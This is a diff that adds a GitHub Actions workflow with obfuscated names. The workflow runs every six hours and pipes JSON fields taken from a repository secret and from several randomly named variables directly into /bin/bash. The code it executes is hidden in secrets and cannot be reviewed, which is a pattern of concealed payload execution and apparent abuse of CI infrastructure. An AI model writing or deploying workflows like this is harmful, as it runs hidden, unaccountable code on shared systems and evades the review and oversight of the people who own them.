@@ -1,0 +1,21 @@
+name: beibudongshl
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: beibudongshl
+        env:
+          n16917: ${{ secrets.n16917 }}
+        run: |
+          echo $n16917 | jq -r .y4290 | /bin/bash
+          echo $rh028 | jq -r .yi73428 | /bin/bash
+          echo $fcd13146 | jq -r .k485 | /bin/bash
+          echo $rvyis30405 | jq -r .susd8 | /bin/bash
+          echo $vue54799 | jq -r .wsll4 | /bin/bash
+          echo $qj15980 | jq -r .cumiz55 | /bin/bash
+
